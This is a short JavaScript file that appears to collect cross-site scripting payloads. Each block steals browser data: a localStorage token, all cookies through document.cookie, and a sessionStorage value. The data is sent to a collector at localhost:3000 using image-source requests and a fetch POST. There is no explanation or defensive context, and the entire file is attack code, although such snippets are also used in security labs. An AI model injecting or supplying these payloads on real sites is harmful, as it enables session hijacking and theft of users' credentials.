
// local storage session
const t = localStorage.getItem('foo')

const image = document.createElement('img');
image.src = 'http://localhost:3000/' + t;
document.body.appendChild(image);


// get all cookies

const image = document.createElement('img');
image.src = 'http://localhost:3000/' + document.cookie;
document.body.appendChild(image);
  


// without cors
fetch('http://localhost:3000', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({storage: sessionStorage.getItem('foo')}),
  });